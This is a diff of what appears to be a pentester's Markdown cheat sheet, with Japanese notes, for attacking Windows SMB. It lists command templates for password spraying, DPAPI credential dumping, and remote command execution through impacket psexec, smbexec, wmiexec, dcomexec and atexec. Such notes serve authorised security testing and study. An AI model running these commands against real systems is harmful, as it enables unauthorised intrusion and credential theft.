@@ -44,9 +44,28 @@ impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME
 ```
 
 
-## 445
+## 445 (139も)
+(msrpcはTCP135番やDynamicPortも使う)
+### donpapi
+```sh
+donpapi
+```
+
+### enum4linux-ng
+```sh
+enum4linux-ng -A -u 'USERNAME' -p 'PASSWORD' -t 'TIMEOUT' 'IP'
+```
+
+### impacket
+```sh
+impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows OR ShellBrowserWindow OR MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
+```
+
 ### netexec
-(rpcを使用するためTCP135番も使う)
 ```sh
 # Password Spraying
 netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
@@ -85,16 +104,6 @@ netexec smb 'IP' --share 'SHARENAME' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-m
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'wmiexec' -x 'COMMAND'
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x 'COMMAND'
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
-```
-
-### impacket
-(rpcを使用するためTCP135番も使う)
-```sh
-impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows OR ShellBrowserWindow OR MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
 
 ### smbclient
